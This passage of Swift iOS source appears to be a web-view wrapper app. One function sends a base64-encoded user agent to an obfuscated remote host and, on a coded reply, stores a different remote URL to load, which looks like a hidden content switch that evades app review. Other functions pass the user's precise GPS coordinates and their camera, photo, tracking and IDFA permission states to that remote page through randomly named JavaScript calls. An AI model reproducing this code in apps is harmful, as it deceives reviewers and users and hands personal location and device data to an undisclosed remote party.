                webView.load(URLRequest(url: url))
            }
        }
        private func upploadPath(){
            let plainString = String(format: "%@:v1.1.0",String().UA)
            let base64String = plainString.data(using: .utf8)?.base64EncodedString() ?? ""
            let qurty = String(format: "?%@co=%@", String.random(),base64String)
            let path = String(format: "https://tubxj7.clomapp.com/rwy8m9%@", qurty)
            NetworkService.shared.getUrl(path) { data, isEnd in
                if isEnd{
                    guard let realData = data as? Data else { return }
                    do {
                        let json = try JSONSerialization.jsonObject(with: realData) as? [String: Any] ?? [:]
                        let codeKey = "code"
                        let dataKey = "data"
                        guard let code = json[codeKey],
                              let dataDict = json[dataKey] as? [String: Any] else {
                            return
                        }
                        if String(format: "%@", code as! CVarArg) == "1003"{
                            let lastKey = dataDict.keys.reversed().first as? String ?? ""
                            let knvhiStr = dataDict[lastKey] as? String ?? ""
                            let parts = knvhiStr.split(separator: ".")
                            let name = String(parts[0]) // "4ir7gbfncryvkfdi"
                            let ext = String(parts[1]) //filetype
                            if  ext == "png"{
                                UserDefaults.standard.setValue(String(format: "https://fwjxwd.clomapp.com/%@?%@fv=v1.1.0",name,String.random()), forKey:  String.hostName())
                            }
                        }
                    }
                    catch {
                        print("JSON Error: \(error)")
                    }
                }else{
                    
                }
            }
        }
        private func setupNotificationObservers() {
            NotificationCenter.default.addObserver(
                self,
                selector: #selector(keyboardWillShow(_:)),
                name: .appKeyboardWillShowNotification,
                object: nil
            )
            NotificationCenter.default.addObserver(
                self,
                selector: #selector(keyboardWillHide(_:)),
                name: .appKeyboardWillHidenNotification,
                object: nil
            )
        }
        @objc private func keyboardWillShow(_ notification: Notification) {
            guard let userInfo = notification.userInfo else { return }
            var jsonDict =  WebViewBridge.shared.processedKeyboardUserInfo(from: userInfo)
            var keyDic: [String: Any] = [:]
            keyDic["UIKeyboardAnimationDurationUserInfoKey"] = jsonDict["UIKeyboardAnimationDurationUserInfoKey"]
            keyDic["UIKeyboardFrameEndUserInfoKey"] = jsonDict["UIKeyboardFrameEndUserInfoKey"]
            keyDic["isShow"] = 1
            guard let jsonStr = String.jsonString(from: keyDic)else { return }
            let js = String(format: "window.%@('kc',%@)", String.typeRandomStr(),jsonStr)
            webView.evaluateJavaScript(js) { (result, error) in
                if error == nil {
                    print("kc Success JS")
                }else{
                    print("kc Error JS")
                }
            }
        }
        @objc private func keyboardWillHide(_ notification: Notification) {
            guard let userInfo = notification.userInfo else { return }
            var jsonDict =  WebViewBridge.shared.processedKeyboardUserInfo(from: userInfo)
            var keyDic: [String: Any] = [:]
            keyDic["UIKeyboardAnimationDurationUserInfoKey"] = jsonDict["UIKeyboardAnimationDurationUserInfoKey"]
            keyDic["UIKeyboardFrameEndUserInfoKey"] = jsonDict["UIKeyboardFrameEndUserInfoKey"]
            keyDic["isShow"] = 0
            guard let jsonStr = String.jsonString(from: keyDic)else { return }
            let js = String(format: "window.%@('kc',%@)", String.typeRandomStr(),jsonStr)
            webView.evaluateJavaScript(js) { (result, error) in
                if error == nil {
                    print("kc Success JS")
                    
                }
            }
        }
        private func checkPermission() {
            if UserDefaults.standard.object(forKey: "locationPermission") != nil {
                AppPermissionTool.shared.getPermissionLocationWithCompletion { latitude, longitude, isAuthorized in
                    if !isAuthorized {
                        self.permission()
                    } else {
                        UserDefaults.standard.set("****", forKey: "islocation")
                        let roundedLatitude = Double(String(format: "%.6f", latitude)) ?? 0
                        let roundedLongitude = Double(String(format: "%.6f", longitude)) ?? 0
                        var locationDic: [String: Any] = [:]
                        locationDic[String.random() + "lt"] = String(roundedLatitude)
                        locationDic[String.random() + "ln"] = String(roundedLongitude)
                        locationDic[String.random() + "lo"] = isAuthorized ? 1 : 0
                        let js = String(format: "window.%@('nc',%@)",String.typeRandomStr(),String.jsonString(from: locationDic) ?? "")
                        self.webView?.evaluateJavaScript(js) { _, error in
                            if error == nil {
                                print("onLocationChange Success JS")
                                self.permission()
                            }
                        }
                    }
                }
            }
        }
        private func permission() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                var permissionDict: [String: Any] = [:]
                permissionDict[String.random() + "um"] = AppPermissionTool.shared.albumPermission()
                permissionDict[String.random() + "ra"] = AppPermissionTool.shared.cameraPermission()
                permissionDict[String.random() + "lo"] = AppPermissionTool.shared.locationPermission
                permissionDict[String.random() + "if"] = AppPermissionTool.shared.notificationPermission
                permissionDict[String.random() + "ng"] = AppPermissionTool.shared.trackingPermission
                permissionDict[String.random() + "fa"] = AppPermissionTool.shared.idfaPermission
                let permStr = String(format: "window.%@('pr',%@)",String.typeRandomStr(), String.jsonString(from: permissionDict) ?? "")
                self.webView.evaluateJavaScript(permStr) { _, error in
                    if error == nil {
                    }else{
                        print(error as Any)
                    }
                }
            }
        }
    }
    extension WebViewHelper: WKNavigationDelegate,UIScrollViewDelegate, WKScriptMessageHandler  {
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            print("Finish WkWebView")
            SVProgressHUD.dismiss()
            UIView.transition(with: self.waitImage, duration: 0.3, options: .transitionCrossDissolve, animations: {
                self.waitImage.isHidden = true
            }, completion: nil)
            UIView.animate(withDuration: 1.5) {
                self.webView.alpha = 1.0
            }
            reachabilityManager?.stopListening()
            permission()
            checkPermission()
            let badgeValue = Int.badgeNumber()
            UserDefaults.standard.setValue(badgeValue, forKey: "badge")
            UIApplication.shared.applicationIconBadgeNumber = badgeValue
        }
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            WebViewBridge.shared.handlerViewController(self, wkWebView: self.webView, handlerWKScriptMessage: message)
        }
        func scrollViewDidScroll(_ scrollView: UIScrollView) {
            let newOffset = scrollView.contentOffset
            if newOffset.y > 0 {
                scrollView.contentOffset = .zero
            }
        }
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            
        }
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
            
        }
        
        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            
        }
    }

//
class NoKeyboardTextField: UITextField {
    override var canBecomeFirstResponder: Bool {
        return false
    }
}
class NavigationController: UINavigationController,UIGestureRecognizerDelegate {
    override func viewDidLoad() {
        super.viewDidLoad()
        self.interactivePopGestureRecognizer?.delegate = self
    }
    func gestureRecognizerShouldBegin(_ gestureRecognizer: UIGestureRecognizer) -> Bool {
        return true
    }
}
